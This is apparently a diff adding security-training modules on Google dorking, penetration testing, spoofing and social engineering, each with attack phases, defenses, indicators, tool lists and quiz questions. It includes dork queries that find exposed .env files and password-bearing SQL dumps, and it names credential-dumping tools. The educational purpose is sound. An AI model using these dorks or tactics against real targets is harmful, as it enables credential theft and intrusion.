+                'Spike in traffic to admin pages, config files, or backup directories from unknown sources',
+                'Access logs showing sequential requests to paths commonly targeted by dorks',
+                'Credential stuffing attempts using credentials harvested from exposed .env or config files',
+                'Requests to /.env, /.git/config, /wp-config.php.bak, /backup.sql from external IPs'
+            ],
+            host: [
+                'Sensitive files present in web-accessible directories (.env, .git, database dumps, log files)',
+                'Directory listing enabled on web servers exposing file structure',
+                'Backup files with predictable names in document roots (.bak, .old, .sql, .tar.gz)',
+                'Admin panels or development tools accessible without authentication',
+                'Default credentials active on exposed management interfaces'
+            ],
+            behavioral: [
+                'Unknown third parties referencing internal information that should not be public',
+                'Credential compromise on services whose passwords were stored in exposed config files',
+                'Reports of your organization appearing in GHDB or security researcher disclosures',
+                'Unauthorized access to admin panels discovered through Google indexing',
+                'Data breach originating from credentials found in publicly indexed files'
+            ],
+            tools: ['Google (advanced operators)', 'DorkSearch.com', 'GHDB (Exploit-DB)', 'Shodan', 'theHarvester', 'Maltego', 'Google Search Console', 'Wayback Machine (web.archive.org)']
+        },
+        interactive: {
+            scenario: 'During a routine security assessment, you run `site:yourcompany.com filetype:env` on Google and discover that your production .env file is indexed and publicly accessible. The file contains: DATABASE_URL with full credentials, AWS_SECRET_ACCESS_KEY, STRIPE_SECRET_KEY, and SESSION_SECRET. The cached version shows it has been indexed for at least 2 weeks. What is your remediation plan?',
+            options: [
+                'Delete the .env file from the web server and add it to .gitignore — the problem is solved',
+                'Add "Disallow: /.env" to robots.txt to prevent future indexing',
+                'ASSUME ALL EXPOSED CREDENTIALS ARE COMPROMISED. Immediately: (1) remove the .env file from the web root, (2) rotate ALL exposed credentials — database password, AWS keys, Stripe keys, session secret, (3) request Google cache removal via Search Console, (4) audit AWS CloudTrail and Stripe dashboard for unauthorized activity during the 2-week exposure window, (5) add server-level blocks for dotfiles, (6) scan for similar exposures across all environments',
+                'Add password protection to the .env file and leave it on the server'
+            ],
+            correct: 2,
+            explanation: 'A 2-week exposure of production credentials means you must ASSUME compromise. Deleting the file alone is insufficient because: (1) the credentials may have already been harvested, (2) Google\'s cache still shows them, (3) the Wayback Machine may have archived them. Full remediation requires rotating EVERY exposed credential (database, AWS, Stripe, sessions), auditing cloud/payment logs for unauthorized use during the exposure window, removing Google\'s cached copy, and fixing the server configuration to block access to all dotfiles (.env, .git, .htaccess) at the web server level.'
+        },
+        quiz: [
+            { question: 'What Google operator limits results to a specific website?', options: ['inurl:', 'site: — for example, site:example.com shows only pages indexed from that domain', 'intitle:', 'filetype:'], correct: 1, explanation: 'The site: operator restricts results to a specific domain. `site:example.com` returns only indexed pages from example.com, useful for mapping an organization\'s web footprint.' },
+            { question: 'What does the Google dork `filetype:sql "INSERT INTO" "password"` search for?', options: ['SQL documentation', 'SQL dump files containing password data — likely database backups with user credentials accidentally exposed on the web', 'Secure password managers', 'SQL injection tutorials'], correct: 1, explanation: 'This dork finds SQL database dump files (filetype:sql) containing INSERT statements with password data — indicating exposed database backups that may contain plaintext or hashed credentials.' },
+            { question: 'Is Google dorking illegal?', options: ['Yes, all Google dorking is illegal', 'Searching is legal; accessing discovered systems without authorization is illegal (unauthorized access violates the CFAA)', 'No, everything found through Google is legal to access', 'Only illegal in certain countries'], correct: 1, explanation: 'Using Google\'s search operators is legal — it\'s public information indexed by a search engine. However, accessing systems, downloading data, or exploiting vulnerabilities discovered through dorking without authorization violates the Computer Fraud and Abuse Act (CFAA) and similar laws.' },
+            { question: 'What is the GHDB (Google Hacking Database)?', options: ['Google\'s internal hacking tools', 'A curated database of Google search queries (dorks) maintained by Exploit-DB that reveal exposed files, vulnerable servers, and sensitive information', 'A database of Google employees', 'Google\'s threat intelligence platform'], correct: 1, explanation: 'The GHDB, maintained by Exploit-DB (Offensive Security), catalogs 6,800+ proven Google dorks organized by category: files containing passwords, vulnerable servers, exposed databases, sensitive directories, and more.' },
+            { question: 'Why is robots.txt NOT a security control for preventing Google dorking?', options: ['robots.txt is encrypted and attackers cannot read it', 'robots.txt is a voluntary directive that well-behaved crawlers follow, but: (1) attackers can read it to find sensitive paths, and (2) not all crawlers respect it — authentication is the real security boundary', 'robots.txt blocks all search engines permanently', 'robots.txt is only for Bing, not Google'], correct: 1, explanation: 'robots.txt is a polite suggestion, not an access control. It actually helps attackers by revealing which directories you consider sensitive (Disallow lines). Proper security requires authentication, access controls, and not placing sensitive files in web-accessible directories.' }
+        ]
+    },
+
+    // =================================================================
+    // 24. PENETRATION TESTING
+    // =================================================================
+    PEN_TESTING: {
+        code: 'PEN_TESTING',
+        title: 'Penetration Testing',
+        icon: '\u{1F9F0}',
+        severity: 'high',
+        color: '#a855f7',
+        description: 'An authorized simulated cyberattack methodology following five phases — reconnaissance, scanning, exploitation, post-exploitation, and reporting — to identify vulnerabilities before real attackers do.',
+        overview: {
+            what: 'Penetration testing (pen testing) is an authorized, methodical process of probing systems, networks, and applications for security vulnerabilities by simulating real-world attack techniques. Unlike vulnerability scanning (automated, identifies potential issues), pen testing actively exploits vulnerabilities to demonstrate real impact. It follows a structured methodology: reconnaissance (information gathering), scanning (enumeration), exploitation (gaining access), post-exploitation (maintaining access, pivoting), and reporting (findings, evidence, remediation). Pen tests require explicit written authorization (Rules of Engagement) and are conducted under legal frameworks.',
+            keyPoints: [
+                'Five phases: Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting',
+                'Three types: Black box (no prior knowledge), White box (full access/source code), Gray box (partial knowledge)',
+                'Rules of Engagement (RoE) define scope, authorized targets, testing windows, and emergency contacts',
+                'Key frameworks: PTES (Penetration Testing Execution Standard), OWASP Testing Guide, NIST SP 800-115',
+                'Certifications: OSCP (Offensive Security), CEH (EC-Council), GPEN (SANS), PenTest+ (CompTIA)'
+            ],
+            examples: [
+                { name: 'Equifax Failure (2017)', detail: 'A pen test would have discovered the unpatched Apache Struts vulnerability (CVE-2017-5638) that led to the breach of 147 million records. The vulnerability had a known exploit and patch available for 2 months before the breach.' },
+                { name: 'SWIFT Banking Tests (2016+)', detail: 'After the $81 million Bangladesh Bank heist, SWIFT mandated pen testing for all member financial institutions. Tests revealed widespread vulnerabilities in banking infrastructure globally.' },
+                { name: 'Tesla Bug Bounty (Ongoing)', detail: 'Tesla\'s pen testing program and bug bounty have identified hundreds of vulnerabilities including remote vehicle unlock, browser-based RCE, and autopilot manipulation — all responsibly disclosed and fixed before exploitation.' }
+            ],
+            stats: [
+                { label: 'Successful breach rate', value: '93%', note: 'of pen tests achieve network perimeter breach (Positive Technologies)' },
+                { label: 'Avg. findings per test', value: '25-50', note: 'vulnerabilities per engagement' },
+                { label: 'Time to first breach', value: '< 4 hours', note: 'average in external pen tests (SANS)' }
+            ]
+        },
+        attackFlow: {
+            title: 'Penetration Testing Methodology',
+            steps: [
+                { phase: 'Reconnaissance (Phase 1)', description: 'Gather intelligence: OSINT (Google dorking, Shodan, social media), DNS enumeration, WHOIS, email harvesting, technology fingerprinting. Passive recon leaves no trace on the target; active recon (port scanning) does.', icon: '\u{1F50D}' },
+                { phase: 'Scanning & Enumeration (Phase 2)', description: 'Active probing: Nmap port scanning, service version detection, vulnerability scanning (Nessus, OpenVAS), web application scanning (Burp Suite, Nikto), directory brute-forcing (Gobuster, ffuf).', icon: '\u{1F4E1}' },
+                { phase: 'Exploitation (Phase 3)', description: 'Exploit discovered vulnerabilities: Metasploit modules, manual exploit development, credential attacks (spraying, brute force), web app exploitation (SQLi, XSS, SSRF), social engineering (if in scope). Document every step for the report.', icon: '\u{26A1}' },
+                { phase: 'Post-Exploitation (Phase 4)', description: 'After gaining access: privilege escalation (linPEAS, winPEAS), lateral movement, credential harvesting (Mimikatz, Responder), persistence mechanisms, pivoting to internal networks, and data access demonstration.', icon: '\u{1F510}' },
+                { phase: 'Reporting (Phase 5)', description: 'Deliver professional report: executive summary, methodology, findings ranked by severity (CVSS), evidence (screenshots, logs), exploitation steps (reproducible), and prioritized remediation recommendations.', icon: '\u{1F4DD}' },
+                { phase: 'Remediation Verification', description: 'After the client patches findings, conduct a retest to verify fixes are effective. Confirm vulnerabilities are resolved and no new issues were introduced by the patches.', icon: '\u{2705}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Your security controls SHOULD detect pen tests — that is part of the assessment',
+                'IDS/IPS alerts during the testing window confirm detection capabilities work',
+                'SOC team should be notified (or not, depending on whether it\'s a "blue team unaware" test)',
+                'Network monitoring should flag reconnaissance and scanning activity',
+                'Log analysis should capture exploitation attempts and lateral movement'
+            ],
+            prevention: [
+                'Regular pen testing IS the prevention — identifies vulnerabilities before real attackers',
+                'Annual pen tests minimum, quarterly for high-risk environments (PCI-DSS requires annual)',
+                'Combine with vulnerability scanning, code review, and bug bounty programs for comprehensive coverage',
+                'Remediate findings within defined SLAs: critical (24h), high (7 days), medium (30 days), low (90 days)',
+                'Rules of Engagement must be signed before testing begins — protects both parties legally'
+            ],
+            response: [
+                'Review pen test report findings and validate each vulnerability',
+                'Prioritize remediation by risk: CVSS score x business impact x exploitability',
+                'Track remediation progress with a findings management system',
+                'Request a retest after remediation to verify fixes are effective',
+                'Update security policies and controls based on systemic findings (not just individual bugs)'
+            ]
+        },
+        indicators: {
+            network: [
+                'Port scanning patterns: sequential or targeted scans from a single source (Nmap signatures)',
+                'Vulnerability scanner traffic: Nessus, OpenVAS, or Qualys plugin signatures',
+                'Web application scanning: rapid sequential requests to common paths (Gobuster, Nikto, ffuf patterns)',
+                'Exploitation attempts: Metasploit module signatures, known exploit payloads',
+                'Credential spraying: single password attempted against many accounts in succession'
+            ],
+            host: [
+                'Failed login attempts from the pen tester\'s authorized IP range',
+                'Privilege escalation tools executed: linPEAS, winPEAS, PowerUp, Sherlock',
+                'Credential dumping attempts: Mimikatz, secretsdump, hashdump in memory or on disk',
+                'Unauthorized process execution or service creation during the testing window',
+                'File modifications or new files in unexpected directories (web shells, backdoors as PoC)'
+            ],
+            behavioral: [
+                'Systematic probing of systems in a methodical pattern (recon → scan → exploit)',
+                'Multiple vulnerability exploitation attempts in a compressed timeframe',
+                'Lateral movement from a compromised system to additional network segments',
+                'Data access attempts across multiple systems to demonstrate breach impact',
+                'Out-of-hours activity aligned with the pen test schedule in the Rules of Engagement'
+            ],
+            tools: ['Nmap', 'Burp Suite Professional', 'Metasploit Framework', 'Cobalt Strike', 'BloodHound (AD)', 'Mimikatz', 'Nessus / OpenVAS', 'OWASP ZAP', 'Gobuster / ffuf', 'Responder', 'CrackMapExec', 'Hashcat / John the Ripper']
+        },
+        interactive: {
+            scenario: 'You are hired to conduct a penetration test for a mid-size financial company. Before starting, the client says: "Just go ahead and test everything — we trust you." They want to skip the formal scoping and Rules of Engagement (RoE) document because "it takes too long." How do you respond?',
+            options: [
+                'Agree and start testing immediately — they gave verbal authorization which is sufficient',
+                'Refuse to begin testing until a formal Rules of Engagement document is signed. Explain that without written RoE defining scope, authorized targets, testing windows, out-of-scope systems, emergency contacts, and legal protections — both parties are at risk. Verbal authorization is not legally binding and "test everything" is dangerously ambiguous.',
+                'Start testing but only on their website to limit the risk',
+                'Send them a generic RoE template and start testing while they review it'
+            ],
+            correct: 1,
+            explanation: 'NEVER begin a pen test without a signed Rules of Engagement document. "Test everything" is dangerously vague — does that include production systems, partner networks, social engineering of employees, physical access, DDoS testing? Without explicit written scope: (1) you have no legal protection if something breaks, (2) the client can claim you exceeded authorization, (3) you might affect systems outside their ownership, (4) there is no emergency contact if you cause an outage. The RoE must define: scope (in/out), methods allowed, testing windows, emergency procedures, data handling, and legal authorization signed by someone with authority to grant it.'
+        },
+        quiz: [
+            { question: 'What are the five phases of penetration testing methodology?', options: ['Plan, Build, Test, Deploy, Monitor', 'Reconnaissance, Scanning, Exploitation, Post-Exploitation, Reporting', 'Discovery, Analysis, Remediation, Verification, Closure', 'Interview, Survey, Observe, Document, Present'], correct: 1, explanation: 'The standard pen test methodology follows: (1) Reconnaissance — gather intelligence, (2) Scanning — enumerate and probe, (3) Exploitation — gain access, (4) Post-Exploitation — escalate and pivot, (5) Reporting — document findings and recommendations.' },
+            { question: 'What is the difference between black box and white box pen testing?', options: ['Black box tests web apps, white box tests networks', 'Black box: tester has no prior knowledge (simulates external attacker); White box: tester has full access to source code, architecture, and credentials (simulates insider or comprehensive audit)', 'Black box is illegal, white box is legal', 'Black box uses Linux, white box uses Windows'], correct: 1, explanation: 'Black box simulates a real attacker with zero knowledge. White box provides full transparency (source code, documentation, credentials) for maximum coverage. Gray box is the middle ground with partial knowledge.' },
+            { question: 'Why are Rules of Engagement (RoE) critical before starting a pen test?', options: ['They make the test more challenging', 'They legally define the authorized scope, methods, timing, and boundaries — protecting both the tester and client from legal liability and unintended damage', 'They are optional for experienced testers', 'They are only needed for government clients'], correct: 1, explanation: 'Without signed RoE, a pen tester could face criminal charges under the CFAA for unauthorized access, and the client has no recourse if the tester causes damage. RoE define what is authorized, what is off-limits, and what happens in emergencies.' },
+            { question: 'What tool is most commonly used for network port scanning during Phase 2?', options: ['Wireshark', 'Metasploit', 'Nmap — the standard for host discovery, port scanning, service detection, and OS fingerprinting', 'Burp Suite'], correct: 2, explanation: 'Nmap (Network Mapper) is the de facto standard for port scanning and network enumeration. It discovers hosts, open ports, running services, OS versions, and can run vulnerability detection scripts (NSE).' },
+            { question: 'After successfully exploiting a web server during a pen test, what should you do FIRST?', options: ['Delete your traces to simulate a real attacker', 'Document the exploitation steps with screenshots and evidence for the report, then proceed to post-exploitation within the authorized scope', 'Immediately notify the client that you gained access', 'Install a permanent backdoor for future testing'], correct: 1, explanation: 'Documentation is critical — every step must be reproducible and evidenced in the final report. The client needs to understand how the exploit worked, what the impact is, and how to fix it. Then proceed to post-exploitation (privilege escalation, lateral movement) within authorized scope.' }
+        ]
+    },
+
+    // =================================================================
+    // 25. SPOOFING
+    // =================================================================
+    SPOOFING: {
+        code: 'SPOOFING',
+        title: 'Spoofing Attacks',
+        icon: '\u{1F3AD}',
+        severity: 'high',
+        color: '#a855f7',
+        description: 'Attacks that falsify identity by impersonating legitimate addresses, protocols, or entities — including IP spoofing, MAC spoofing, ARP spoofing, DNS spoofing, and email spoofing.',
+        overview: {
+            what: 'Spoofing is the act of disguising a communication or identity to appear as a trusted source. Attackers forge source addresses, protocol fields, or entity identities to bypass security controls, intercept traffic, redirect communications, or impersonate legitimate parties. Major variants include: IP spoofing (forged source IP), MAC spoofing (cloned hardware address), ARP spoofing (poisoned ARP cache for MITM), DNS spoofing/cache poisoning (redirected domain resolution), and email spoofing (forged sender headers). Each type exploits implicit trust in protocol-level identifiers.',
+            keyPoints: [
+                'IP Spoofing: forged source IP in packets — used for DDoS amplification, bypass IP-based ACLs, and reflection attacks',
+                'ARP Spoofing: sends fake ARP replies to poison the victim\'s ARP cache, redirecting traffic through the attacker (MITM)',
+                'DNS Spoofing: corrupts DNS cache or intercepts queries to redirect domain lookups to attacker-controlled IPs',
+                'MAC Spoofing: changes the hardware MAC address to bypass port security, NAC, or impersonate trusted devices',
+                'Email Spoofing: forged From/Reply-To headers to impersonate trusted senders (combated by SPF, DKIM, DMARC)'
+            ],
+            examples: [
+                { name: 'Memcached DDoS Amplification (2018)', detail: 'Attackers used IP spoofing to send small requests to Memcached servers with the victim\'s spoofed source IP. The 51,000x amplification factor generated a record 1.7 Tbps DDoS attack against GitHub.' },
+                { name: 'DNS Cache Poisoning — Kaminsky Attack (2008)', detail: 'Dan Kaminsky discovered a fundamental DNS vulnerability allowing cache poisoning of recursive resolvers. An attacker could redirect any domain\'s traffic to a malicious server, affecting millions of users per resolver.' },
+                { name: 'BGP Hijack — Pakistan/YouTube (2008)', detail: 'Pakistan Telecom announced a false BGP route for YouTube\'s IP prefix to block it domestically, but the announcement leaked globally, redirecting worldwide YouTube traffic to Pakistan for 2 hours.' }
+            ],
+            stats: [
+                { label: 'DDoS using IP spoofing', value: '~40%', note: 'of DDoS attacks use source IP spoofing (NETSCOUT)' },
+                { label: 'Email spoofing', value: '~90%', note: 'of phishing emails use some form of sender spoofing' },
+                { label: 'ARP spoofing in pen tests', value: '~70%', note: 'success rate on unsegmented LANs' }
+            ]
+        },
+        attackFlow: {
+            title: 'Spoofing Attack Methodology',
+            steps: [
+                { phase: 'Reconnaissance', description: 'Attacker maps the target network: identifies IP ranges, MAC addresses (ARP table), DNS servers, email infrastructure (MX records, SPF/DKIM/DMARC policies), and trust relationships between systems.', icon: '\u{1F50D}' },
+                { phase: 'Identity Selection', description: 'Chooses which identity to impersonate: a trusted internal IP, the gateway\'s MAC address, an authoritative DNS server, or a legitimate email sender (executive, vendor, IT support).', icon: '\u{1F464}' },
+                { phase: 'Forgery Execution', description: 'Crafts and sends spoofed packets/messages: raw socket IP packets with forged source (Scapy), gratuitous ARP replies (Ettercap, arpspoof), DNS responses with malicious records, or SMTP messages with forged headers.', icon: '\u{270F}' },
+                { phase: 'Trust Exploitation', description: 'The victim\'s system accepts the spoofed communication as legitimate: firewall allows the "trusted" IP, switch forwards traffic to the spoofed MAC, resolver caches the poisoned DNS entry, user trusts the spoofed email.', icon: '\u{1F91D}' },
+                { phase: 'Attack Execution', description: 'Attacker achieves the objective: MITM position (ARP/DNS spoofing), reflected DDoS (IP spoofing), credential theft (DNS to fake login page), malware delivery (email spoofing), or network access (MAC spoofing past NAC).', icon: '\u{26A1}' },
+                { phase: 'Persistence & Evasion', description: 'Maintains the spoofed state: continuous ARP poisoning to stay in MITM position, TTL manipulation to keep DNS cache poisoned, or rotating spoofed source IPs to complicate DDoS mitigation.', icon: '\u{1F504}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'ARP monitoring tools detecting duplicate IP-to-MAC mappings (arpwatch, XArp)',
+                'DNS monitoring for cache mismatches, unexpected TTL changes, or responses from unauthorized servers',
+                'Email authentication failures: SPF fail, DKIM invalid, DMARC reject/quarantine logs',
+                'Network IDS detecting ARP spoofing signatures, gratuitous ARP floods, or IP source anomalies',
+                'Ingress/egress filtering violations: packets with source IPs that should not originate from the observed network segment'
+            ],
+            prevention: [
+                'BCP38/BCP84 ingress filtering: routers reject packets with spoofed source IPs at the network edge',
+                'Dynamic ARP Inspection (DAI) on switches: validates ARP packets against DHCP snooping bindings',
+                'DNSSEC: cryptographically signs DNS records to prevent cache poisoning and response forgery',
+                'Email authentication: deploy SPF + DKIM + DMARC (p=reject) to prevent email sender spoofing',
+                '802.1X port-based authentication: validates device identity before granting network access (defeats MAC spoofing)'
+            ],
+            response: [
+                'ARP spoofing detected: identify the spoofing source by port, isolate the device, flush ARP caches on affected hosts',
+                'DNS spoofing detected: flush DNS caches, switch to trusted resolvers (DoH/DoT), verify DNSSEC deployment',
+                'Email spoofing campaign: alert users, quarantine related messages, strengthen DMARC policy to p=reject',
+                'IP spoofing for DDoS: work with upstream ISP to filter spoofed traffic, engage DDoS mitigation service',
+                'Investigate the full scope — spoofing is often a means to another attack (MITM, credential theft, phishing)'
+            ]
+        },
+        indicators: {
+            network: [
+                'Multiple MAC addresses associated with the same IP (ARP spoofing)',
+                'Gratuitous ARP packets at high frequency from a non-gateway device',
+                'DNS responses arriving from unexpected source IPs or with unusual TTL values',
+                'Packets with source IPs that are impossible for the network segment (RFC 1918 from WAN, external IPs from LAN)',
+                'Email headers showing SPF/DKIM/DMARC failures with Return-Path mismatches'
+            ],
+            host: [
+                'ARP cache entries that change frequently or point to unexpected MAC addresses',
+                'DNS resolution returning unexpected IP addresses for known domains',
+                'SSL/TLS certificate warnings when accessing normal websites (DNS spoofing to MITM)',
+                'Email client showing authentication warnings or "sent via" mismatches',
+                'Network adapter operating in promiscuous mode (potential attacker system)'
+            ],
+            behavioral: [
+                'Users reporting SSL certificate warnings on familiar websites',
+                'Employees receiving emails from "executives" with unusual requests and spoofed headers',
+                'Network performance degradation caused by ARP storm or MITM traffic redirection',
+                'Authentication failures correlating with ARP/DNS anomalies (credentials intercepted)',
+                'Unusual traffic patterns: all subnet traffic flowing through a single non-gateway host'
+            ],
+            tools: ['Ettercap', 'arpspoof (dsniff)', 'Bettercap', 'Scapy', 'hping3', 'Responder', 'arpwatch', 'XArp', 'dnschef', 'SPF/DKIM/DMARC analyzers (MXToolbox)', 'Wireshark']
+        },
+        interactive: {
+            scenario: 'A user on your corporate network reports that when they visit the company intranet (intranet.company.com), their browser shows an SSL certificate warning. You investigate and find that: (1) the DNS response for intranet.company.com returns a different IP than expected, (2) arpwatch has flagged that the default gateway\'s MAC address changed 30 minutes ago, and (3) a device on the network is sending gratuitous ARP replies every 2 seconds. What is happening and what do you do?',
+            options: [
+                'The SSL certificate has expired — renew it and the warnings will stop',
+                'An attacker is conducting ARP spoofing to position themselves as a man-in-the-middle, intercepting and modifying DNS responses to redirect intranet traffic to a credential-harvesting site. Immediately: (1) identify the spoofing device by the MAC address in the gratuitous ARPs, (2) isolate the device at the switch port, (3) flush ARP caches on all affected hosts, (4) verify DNS integrity, (5) warn all users not to bypass certificate warnings, (6) enable Dynamic ARP Inspection on switches.',
+                'The network switch is malfunctioning — reboot it to clear the ARP table',
+                'The user\'s browser cache is corrupted — clear the cache and retry'
+            ],
+            correct: 1,
+            explanation: 'This is a classic ARP spoofing + DNS spoofing MITM attack chain. The attacker sends gratuitous ARP replies claiming to be the default gateway (changing the gateway\'s MAC in victims\' ARP caches). All traffic now flows through the attacker, who modifies DNS responses to redirect the intranet domain to a fake site. The SSL certificate warning is the defense working — the attacker cannot forge a valid certificate for the real domain. Remediation: locate the attacker by the spoofing MAC, shut the port, clear ARP caches, verify DNS, and deploy DAI to prevent future ARP spoofing.'
+        },
+        quiz: [
+            { question: 'How does ARP spoofing enable a man-in-the-middle attack?', options: ['It breaks the target\'s internet connection', 'The attacker sends fake ARP replies claiming their MAC address is the gateway, causing the victim to route all traffic through the attacker', 'It encrypts traffic between two hosts', 'It changes the victim\'s IP address'], correct: 1, explanation: 'ARP spoofing poisons the victim\'s ARP cache, replacing the real gateway MAC with the attacker\'s MAC. The victim unknowingly sends all traffic to the attacker, who forwards it to the real gateway (after inspection/modification) — creating a transparent MITM position.' },
+            { question: 'What three email authentication protocols work together to prevent email spoofing?', options: ['SSL, TLS, and HTTPS', 'SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC (Domain-based Message Authentication)', 'POP3, IMAP, and SMTP', 'AES, RSA, and SHA'], correct: 1, explanation: 'SPF specifies which mail servers can send for a domain, DKIM adds a cryptographic signature to emails, and DMARC tells receivers what to do when SPF/DKIM fail (reject, quarantine). Together they make email spoofing detectable and blockable.' },
+            { question: 'What is BCP38 (RFC 2827) and how does it prevent IP spoofing?', options: ['It encrypts all IP traffic', 'It requires routers to perform ingress filtering — dropping packets whose source IP addresses are not valid for the network segment they arrive from', 'It assigns unique IP addresses to every device', 'It blocks all international traffic'], correct: 1, explanation: 'BCP38 requires border routers to verify that the source IP of incoming packets matches the expected address range for that interface. If a packet claims to come from an IP not in that subnet, it is dropped — preventing spoofed source addresses from leaving the network.' },
+            { question: 'How does DNSSEC prevent DNS spoofing/cache poisoning?', options: ['It encrypts DNS queries', 'It cryptographically signs DNS records so resolvers can verify that responses are authentic and unmodified', 'It blocks all DNS traffic from unknown servers', 'It requires passwords for DNS lookups'], correct: 1, explanation: 'DNSSEC adds digital signatures to DNS records using public key cryptography. Resolvers verify signatures against the chain of trust from the root zone, rejecting any response that has been modified or forged — preventing cache poisoning.' },
+            { question: 'Why does an attacker need to send ARP spoofing packets continuously, not just once?', options: ['Because ARP packets are unreliable', 'Because legitimate ARP replies from the real gateway will periodically correct the victim\'s ARP cache — the attacker must continuously re-poison it to maintain the MITM position', 'Because ARP only works with continuous traffic', 'Because switches delete ARP entries after each packet'], correct: 1, explanation: 'ARP caches have timeouts and are updated by legitimate traffic. The real gateway periodically sends ARP replies that would restore the correct MAC mapping. The attacker must send poisoned ARP replies at a higher frequency to keep overwriting the legitimate entries.' }
+        ]
+    },
+
+    // =================================================================
+    // 26. ADVANCED SOCIAL ENGINEERING TACTICS
+    // =================================================================
+    SOCIAL_ENGINEERING_TACTICS: {
+        code: 'SOCIAL_ENGINEERING_TACTICS',
+        title: 'Advanced Social Engineering Tactics',
+        icon: '\u{1F9E0}',
+        severity: 'high',
+        color: '#a855f7',
+        description: 'Advanced tactical social engineering methods — pretexting, baiting, tailgating, quid pro quo, and watering hole attacks — with operational depth beyond basic phishing awareness.',
+        overview: {
+            what: 'While basic social engineering relies on simple deception, advanced social engineering tactics involve carefully crafted operational tradecraft. Pretexting builds elaborate false identities over weeks. Baiting exploits curiosity with physical or digital lures. Tailgating and piggybacking defeat physical access controls through social compliance. Quid pro quo offers a service or favor in exchange for information. Watering hole attacks compromise websites frequented by the target group. These tactics combine OSINT, psychology, patience, and operational security to defeat even security-aware targets.',
+            keyPoints: [
+                'Pretexting: building a persistent fake identity with supporting evidence (business cards, LinkedIn profiles, spoofed caller ID, backstory)',
+                'Baiting: physical (USB drops in parking lots, labeled "Salary Data") or digital (free software, pirated content with embedded malware)',
+                'Tailgating/Piggybacking: bypassing physical security by following authorized personnel, using props (uniforms, boxes, ladders)',
+                'Quid Pro Quo: offering technical support, free audits, or favors in exchange for credentials or access ("I\'m from IT, I can fix that if you give me your password")',
+                'Watering Hole: compromising a website frequented by the target group to deliver drive-by exploits to visitors'
+            ],
+            examples: [
+                { name: 'Operation Aurora Watering Hole (2009)', detail: 'Attributed to APT17 (China), attackers compromised websites frequented by defense and technology employees, using a zero-day Internet Explorer exploit. Targets included Google, Adobe, Juniper, and 30+ companies.' },
+                { name: 'USB Drop Study — University of Illinois (2016)', detail: 'Researchers dropped 297 USB drives across campus. 48% were picked up and plugged into computers, with some users opening files within 6 minutes. Demonstrated that curiosity overwhelms security training.' },
+                { name: 'Deepfake CEO Voice Scam (2019)', detail: 'Criminals used AI-generated voice deepfake technology to impersonate a CEO\'s voice on a phone call, convincing a UK energy company executive to wire $243,000 to a fraudulent account. The executive believed he was speaking to his boss.' }
+            ],
+            stats: [
+                { label: 'USB drop success rate', value: '48%', note: 'of dropped USB drives are plugged in (University of Illinois study)' },
+                { label: 'Watering hole prevalence', value: '~11%', note: 'of targeted attacks use watering hole technique (Symantec)' },
+                { label: 'Deepfake fraud losses', value: '$25M+', note: 'Arup engineering firm deepfake video call scam (2024)' }
+            ]
+        },
+        attackFlow: {
+            title: 'Advanced Social Engineering Operation',
+            steps: [
+                { phase: 'OSINT & Target Profiling', description: 'Deep reconnaissance: LinkedIn for org structure and relationships, social media for personal interests and habits, corporate website for technology stack, FOIA/public records for contracts, dark web for breached credentials. Build a comprehensive target dossier.', icon: '\u{1F50D}' },
+                { phase: 'Pretext Construction', description: 'Build a believable identity with supporting evidence: create LinkedIn/social media profiles, register a lookalike domain, obtain business cards and branded materials, set up a spoofed caller ID, and rehearse the backstory to handle unexpected questions.', icon: '\u{1F3AD}' },
+                { phase: 'Access Channel Selection', description: 'Choose the optimal attack channel based on the target profile: phone vishing (authority-responsive targets), physical tailgating (poor badge discipline), USB baiting (curious tech workers), watering hole (security-conscious groups who avoid phishing).', icon: '\u{1F4F1}' },
+                { phase: 'Trust Establishment', description: 'Initiate contact and build trust over time: initial "warm" contact establishes familiarity, follow-up interactions deepen trust, name-dropping colleagues and referencing real projects builds credibility. May span days or weeks.', icon: '\u{1F91D}' },
+                { phase: 'Exploitation Trigger', description: 'Execute the attack when trust is established and conditions are right: request credentials during a "crisis," drop USB drives before a company event, tailgate during a busy entry period, or activate the watering hole exploit when target employees visit the compromised site.', icon: '\u{26A1}' },
+                { phase: 'Operational Exit', description: 'Cleanly disengage without raising suspicion: close the pretext scenario naturally, remove or abandon the fake identity, and cover operational traces. The target may never realize they were manipulated.', icon: '\u{1F6B6}' }
+            ]
+        },
+        defense: {
+            detection: [
+                'Physical security monitoring: cameras and guards at access points watching for tailgating',
+                'USB device monitoring: endpoint agents logging all USB device insertions with alerts for unknown devices',
+                'Web browsing analysis: detecting when frequented external websites suddenly serve suspicious content (watering hole)',
+                'Vishing detection: caller ID verification systems and employee reporting of suspicious calls',
+                'Social media monitoring: detecting fake profiles impersonating executives or employees'
+            ],
+            prevention: [
+                'Security awareness training focused on SPECIFIC tactics with realistic simulations (not just generic phishing)',
+                'Physical access controls: mantraps (air locks), badge readers requiring individual authentication, anti-tailgating sensors',
+                'USB device policies: disable autorun, deploy endpoint DLP that blocks unauthorized USB devices',
+                'Web isolation: browse external sites through a cloud-based browser isolation service',
+                'Callback verification procedures: always call back on a KNOWN number (never a number provided by the caller)'
+            ],
+            response: [
+                'If pretexting is identified: document the interaction details, alert security team, warn other potential targets',
+                'If USB baiting is detected: collect and forensically image the devices, scan all systems that may have been connected',
+                'If tailgating occurred: review camera footage, determine what areas were accessed, sweep for planted devices',
+                'If a watering hole is discovered: block the compromised URL, scan all employee systems that visited the site recently',
+                'Conduct a post-incident awareness brief so the specific tactic becomes recognizable organization-wide'
+            ]
+        },
+        indicators: {
+            network: [
+                'Newly registered domains mimicking partner or vendor names (pretext infrastructure)',
+                'Outbound traffic to recently compromised legitimate websites (watering hole exploitation)',
+                'Drive-by download attempts from trusted external sites employees regularly visit',
+                'VoIP traffic from spoofed caller IDs matching internal or partner phone numbers',
+                'DNS queries for lookalike domains (typosquatting of partners, vendors, or internal domains)'
+            ],
+            host: [
+                'Unknown USB devices being connected to workstations, especially in common areas',
+                'Malware execution originating from USB-mounted files or AutoRun',
+                'Browser exploitation (drive-by downloads) originating from legitimate but compromised websites',
+                'New remote access tools installed after phone-based social engineering calls',
+                'Files with enticing names appearing on network shares ("Salary_2026.xlsx", "Layoff_List.pdf")'
+            ],
+            behavioral: [
+                'Employees reporting contact from unfamiliar people who demonstrate unusual knowledge of internal operations',
+                'Badge-less individuals in secure areas who cannot be identified by staff',
+                'USB drives or other devices found in parking lots, lobbies, or common areas',
